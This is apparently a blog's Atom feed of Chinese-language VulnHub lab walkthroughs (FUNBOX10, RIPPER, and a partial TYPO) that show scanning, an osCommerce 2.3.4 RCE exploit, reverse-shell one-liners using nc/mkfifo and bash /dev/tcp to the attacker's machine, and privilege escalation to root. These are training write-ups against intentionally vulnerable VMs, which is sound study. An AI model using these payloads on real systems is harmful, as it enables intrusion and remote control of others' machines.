<?xml version="1.0"?>
<feed xmlns="http://www.w3.org/2005/Atom">
    <id>http://www.n1h1l157.live</id>
    <title>X_T • Posts by &#34;vulnhub 21-30&#34; tag</title>
    <link href="http://www.n1h1l157.live" />
    <updated>2021-10-31T16:00:00.000Z</updated>
    <category term="ENTJ" />
    <category term="ENFJ" />
    <category term="ENFP" />
    <category term="ENTP" />
    <category term="ESFJ" />
    <category term="ESFP" />
    <category term="ESTP" />
    <category term="INFJ" />
    <category term="INFP" />
    <category term="ESTJ" />
    <category term="INTJ" />
    <category term="INTP" />
    <category term="ISFP" />
    <category term="ISFJ" />
    <category term="ISTJ" />
    <category term="MBTI" />
    <category term="ISTP" />
    <category term="心理测试" />
    <category term="渗透测试" />
    <category term="灵性" />
    <category term="Linux" />
    <category term="Trojan" />
    <category term="微信" />
    <category term="信息安全网址" />
    <category term="树莓派" />
    <category term="生命" />
    <category term="人生" />
    <category term="命运" />
    <category term="人生哲学" />
    <category term="成长" />
    <category term="神学" />
    <category term="社会" />
    <category term="历史" />
    <category term="爱情" />
    <category term="人性" />
    <category term="意义" />
    <category term="道德" />
    <category term="VULNHUB 1-10" />
    <category term="VULNHUB 11-20" />
    <category term="VULNHUB 21-30" />
    <category term="VULNHUB 31-40" />
    <category term="VULNHUB 41-50" />
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/122%20FUNBOX10/</id>
        <title>VULNHUB 22 FUNBOX10</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/122%20FUNBOX10/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvZnVuYm94LXVuZGVyLWNvbnN0cnVjdGlvbiw3MTUv&#34;&gt;https://www.vulnhub.com/entry/funbox-under-construction,715/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3RpbWVzbGVlcC9hcnRpY2xlL2RldGFpbHMvMTI0MDA1NDM0&#34;&gt;https://blog.csdn.net/timesleep/article/details/124005434&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 FUNBOX10：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-503.png&#34; width=&#34;540&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.133&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.133&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-504.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,25,80,110,133&lt;/p&gt;
&lt;p&gt;SMTP（简单邮件传输协议）是用于发送和接收电子邮件的 TCP/IP 协议。但是，由于它在接收端对消息进行排队的能力有限，因此它通常与其他两种协议（POP3 或 IMAP）中的一种一起使用，让用户将消息保存在服务器邮箱中并定期从服务器下载它们。&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMz&#34;&gt;http://192.168.31.133&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-505.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.133&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-506.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;对扫描的网址进行挨个测试，发现到一个敏感网址:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2c=&#34;&gt;http://192.168.31.133/catalog&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-507.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;oscommerce-漏洞寻找&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oscommerce-漏洞寻找&#34;&gt;#&lt;/a&gt; oscommerce 漏洞寻找&lt;/h3&gt;
&lt;p&gt;靶机上存在 oscommerce，直接搜索是否存在相应的 exp&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-508.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;默认进入的漏洞利用并不能直接权限提升，用更精确的搜寻来寻找在 exploit-db 上搜查 osCommerce 2.3.4 存在的漏洞&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-509.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 搜索到了一个 RCE 漏洞，此影响较大，可直接拿到 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-510.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;exploit-db-使用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#exploit-db-使用&#34;&gt;#&lt;/a&gt; exploit-db 使用&lt;/h3&gt;
&lt;p&gt;获取漏洞利用代码 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuZXhwbG9pdC1kYi5jb20vZXhwbG9pdHMvNDQzNzQ=&#34;&gt;https://www.exploit-db.com/exploits/44374&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-511.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看该漏洞是如何利用的&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-512.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要两个地址，一个是基础的路径，一个是目标路径&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=&#34;&gt; http://192.168.31.133/catalog/install/index.php&lt;/span&gt;&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4&lt;/span&gt;&lt;/p&gt;
&lt;p&gt;同时也可以从 searchsploit 获取到漏洞利用的代码&lt;br&gt;
 searchsploit osCommerce 2.3.4.1&lt;br&gt;
searchsploit -x php/webapps/44374.py&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-513.png&#34; width=&#34;700&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;查看 exp 利用方式的两个 url 地址是否能正常访问&lt;br&gt;
&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHA=&#34;&gt; http://192.168.31.133/catalog/install/index.php&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-514.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-515.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;oscommerce-漏洞利用&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#oscommerce-漏洞利用&#34;&gt;#&lt;/a&gt; oscommerce 漏洞利用&lt;/h3&gt;
&lt;p&gt;从 searchsploit 中获取到的 exp 复制出来，进行修正&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-516.png&#34; width=&#34;420&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;需要修改的有三个地方，两个 url 地址，以及要执行的命令&lt;br&gt;
 base_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbmRleC5waHAlRTIlODAlOUQ=&#34;&gt;http://192.168.31.133/catalog/install/index.php”&lt;/span&gt;&lt;br&gt;
target_url=“&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuMTMzL2NhdGFsb2cvaW5zdGFsbC9pbnN0YWxsLnBocD9zdGVwPTQlRTIlODAlOUQ=&#34;&gt;http://192.168.31.133/catalog/install/install.php?step=4”&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-517.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;执行反弹 shell 的命令，调用系统去在 /tmp 里边写一个文件，用来反弹&lt;br&gt;
 payload += ‘system (“rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2&amp;gt;&amp;amp;1|nc 192.168.31.135 4444 &amp;gt;/tmp/f”);’&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-518.png&#34; width=&#34;580&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;运行此 exp，得到一个 url 地址，是用来触发命令的链接&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-519.png&#34; width=&#34;560&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;监听 kali 机器上的 4444 端口，同时访问该 url 地址使得命令被执行，得到反弹的 shell&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-520.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;紧接着用python3 拿到一个标准的终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python3 -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-521.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;pspy64-监控&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#pspy64-监控&#34;&gt;#&lt;/a&gt; pspy64 监控&lt;/h3&gt;
&lt;p&gt;翻阅目录时并没有找到敏感文件，直接上传一个 pspy&lt;br&gt;
 监控靶机上有没有定期执行一些需要高权限才能执行的命令&lt;/p&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;wget 192.168.31.135/pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;chmod +x pspy64s&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;./pspy64s&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-522.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;看到有个计划任务被执行，查看后发现其中有一串 base64 加密数据，&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-523.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 解密后发现是 root 的密码，su root 提权成功&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/</id>
        <title>VULNHUB 21 RIPPER</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/121%20RIPPER/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvcmlwcGVyLTEsNzA2Lw==&#34;&gt;https://www.vulnhub.com/entry/ripper-1,706/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3FxXzQyOTQ3ODE2L2FydGljbGUvZGV0YWlscy8xMjMzMzI1ODI=&#34;&gt;https://blog.csdn.net/qq_42947816/article/details/123332582&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 RIPPER：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1）arp 确定靶机地址&lt;br&gt;
 &lt;code&gt;sudo arp-scan -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-480.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.84&lt;/p&gt;
&lt;p&gt;2）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p- 192.168.31.115&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-481.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,10000&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ=&#34;&gt;http://192.168.31.84&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-482.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;&lt;code&gt;dirsearch -u http://192.168.31.84&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-483.png&#34; width=&#34;340&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;没有什么新发现，先不管 80 端口的 web&lt;br&gt;
 查看网站:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMzEuODQ6MTAwMDA=&#34;&gt;http://192.168.31.84:10000&lt;/span&gt; 进行信息收集&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-484.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;提示会跳转到 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;br&gt;
 修改本地 hosts 文件，将 url 地址改为目标靶机 ip 地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-485.png&#34; width=&#34;290&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到页面 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-486.png&#34; width=&#34;590&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;一个 webmin 的登陆页面，收集此网站的相关信息&lt;/p&gt;
&lt;h3 id=&#34;robots-页面查看&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#robots-页面查看&#34;&gt;#&lt;/a&gt; robots 页面查看&lt;/h3&gt;
&lt;p&gt;查看目录:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JvYm90cy50eHQ=&#34;&gt;https://ripper-min:10000/robots.txt&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-487.png&#34; width=&#34;480&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;找到一个提示，采用的 base64 加密，解密后得到一个关键词 “rips”&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-488.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;直接将 rips 拿到谷歌上搜索，它是一个做代码分析的工具&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-489.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到 rips 官网得知，其安装下载之后的目录在 /rips/ 里边&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-490.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在原来的 url 地址上拼接上 rips 看是否能有新发现:&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAwL3JpcHM=&#34;&gt;https://ripper-min:10000/rips&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-491.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 此页面并没有任何反应，别忘了我们还有一个 80 端口&lt;/p&gt;
&lt;h3 id=&#34;rip-扫描-web&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#rip-扫描-web&#34;&gt;#&lt;/a&gt; rip 扫描 web&lt;/h3&gt;
&lt;p&gt;&lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly8xOTIuMTY4LjMxLjg0L3JpcHMv&#34;&gt;https://192.168.31.84/rips/&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-492.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;进入到了 rips 代码审计的界面，看样子需要填一个 path，根据要求填写为 /var/www 后点击扫描&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-493.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;扫描到了一些漏洞，并且看到了一个敏感文件 secret.php，点击 secret.php 文件&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-494.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 得到了泄漏出来的账户和密码 ripper:Gamespeop&lt;/p&gt;
&lt;h3 id=&#34;可访问文件筛选&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#可访问文件筛选&#34;&gt;#&lt;/a&gt; 可访问文件筛选&lt;/h3&gt;
&lt;p&gt;爆出来的密码可能是 ssh 连接的密码，也可能是网站后台密码，通过 ssh 连接判断是否能登陆到对方的服务器上&lt;br&gt;
 &lt;code&gt;ssh 192.168.31.84 -l ripper&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-495.png&#34; width=&#34;460&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 成功拿到 ripper 的权限，尝试去拿 root 账户的权限&lt;/p&gt;
&lt;p&gt;查询目录结构，看到出了 ripper 之外的另外一个用户 cubes&lt;br&gt;
 查看出了基础的几个基本目录后，是否有其他文件是这两个用户能操作的&lt;br&gt;
 &lt;code&gt;find / -user ripper 2&amp;gt;/dev/null | grep -v “proc\|home\|run\|sys”&lt;/code&gt; &lt;br&gt;
 &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-496.png&#34; width=&#34;610&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;发现 cubes 可以操作的文件有一个 secret.file 文件，查看后得到密码&lt;br&gt;
 su cubes 输入密码后成功拿到了 cubes 的权限&lt;/p&gt;
&lt;p&gt;借助 find 来寻找属于用户 cubes 可以操作的文件&lt;br&gt;
 &lt;code&gt;find / -user cubes 2&amp;gt;/dev/null | grep -v “home\|proc”&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-497.png&#34; width=&#34;620&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;备份文件泄露&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#备份文件泄露&#34;&gt;#&lt;/a&gt; 备份文件泄露&lt;/h3&gt;
&lt;p&gt;&lt;code&gt;cat /var/webmin/backup/miniser.log&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-498.png&#34; width=&#34;650&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 找到了敏感信息 webmin 的账户和密码：admin:tokiohotel&lt;/p&gt;
&lt;p&gt;进入 webmin 的网站后台登陆地址，输入账户密码进入后台 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly9yaXBwZXItbWluOjEwMDAw&#34;&gt;https://ripper-min:10000&lt;/span&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-499.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;在后台中发现有个 terminal 的标志，直接点击此按钮&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-500.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;h3 id=&#34;后台反弹-shell&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#后台反弹-shell&#34;&gt;#&lt;/a&gt; 后台反弹 shell&lt;/h3&gt;
&lt;p&gt;点击后在 web 页面就会弹出来一个终端窗口，而且是 root 权限的&lt;/p&gt;
&lt;p&gt;但是在 web 界面操作并不是很方遍，接下来把此 shell 进行反弹&lt;br&gt;
 &lt;code&gt;bash - c ‘bash -I &amp;gt;&amp;amp; /dev/tcp/192.168.31.135/4444 0&amp;gt;&amp;amp;1’&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-501.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;figure class=&#34;highlight shell&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta prompt_&#34;&gt;# &lt;/span&gt;&lt;span class=&#34;language-bash&#34;&gt;接受反弹的shell，并且美化终端&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;nc -lvvp 4444&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;python -c &amp;quot;import pty;pty.spawn(&amp;#x27;/bin/bash&amp;#x27;)&amp;quot;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;stty raw -echo;fg&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;export TERM=xterm&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-502.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 最后拿到了一个 root 账户的标准 shell&lt;/p&gt;
</content>
        <category term="VULNHUB 21-30" />
        <updated>2021-10-31T16:00:00.000Z</updated>
    </entry>
    <entry>
        <id>http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/</id>
        <title>VULNHUB 27 TYPO</title>
        <link rel="alternate" href="http://www.n1h1l157.live/2021/11/01/VULNHUB/127%20TYPO/"/>
        <content type="html">&lt;p&gt;靶机下载地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cudnVsbmh1Yi5jb20vZW50cnkvdHlwby0xLDQ3Mi8=&#34;&gt;https://www.vulnhub.com/entry/typo-1,472/&lt;/span&gt;&lt;br&gt;
 教程链接地址: &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cHM6Ly93d3cuaW5mb3NlY2FydGljbGVzLmNvbS90eXBvLTEtdnVsbmh1Yi13YWxrdGhyb3VnaC8=&#34;&gt;https://www.infosecarticles.com/typo-1-vulnhub-walkthrough/&lt;/span&gt;&lt;/p&gt;
&lt;h3 id=&#34;确认攻击目标&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#确认攻击目标&#34;&gt;#&lt;/a&gt; 确认攻击目标&lt;/h3&gt;
&lt;p&gt;攻击机 KALI： 192.168.31.135&lt;br&gt;
 靶机 TYPO：桥接于 192.168.31.1 的网卡，ip 未知&lt;/p&gt;
&lt;p&gt;1 ）确定靶机 ip 地址&lt;br&gt;
 &lt;code&gt;sudo arp-sacn -l&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-662.png&#34; width=&#34;520&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机 ip：192.168.31.153&lt;/p&gt;
&lt;p&gt;2 ）确认靶机 ip 开放的端口信息&lt;br&gt;
 &lt;code&gt;sudo nmap -p 192.168.0.153&lt;/code&gt;&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-663.png&#34; width=&#34;440&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;-&amp;gt; 靶机开放端口 22,80,8000,8080,8081&lt;/p&gt;
&lt;h3 id=&#34;网站信息收集&#34;&gt;&lt;a class=&#34;markdownIt-Anchor&#34; href=&#34;#网站信息收集&#34;&gt;#&lt;/a&gt; 网站信息收集&lt;/h3&gt;
&lt;p&gt;依次打开 80,8000,8080,8081 的网站进行访问，收集相关信息&lt;/p&gt;
&lt;p&gt;打开 &lt;span class=&#34;exturl&#34; data-url=&#34;aHR0cDovLzE5Mi4xNjguMC4xNTM=&#34;&gt;http://192.168.0.153&lt;/span&gt; 进行信息收集，发现网站是一个 typo3 的地址&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-664.png&#34; width=&#34;570&#34; alt=&#34;Image&#34;&gt;
&lt;p&gt;打开 http://192.168.0.153:8000 搜集信息&lt;/p&gt;
&lt;img data-src=&#34;/N1h1l157/VULNHUB/image-665.png&#34; width=&#34;500&#34; alt=&#34;Image&#34;&gt;
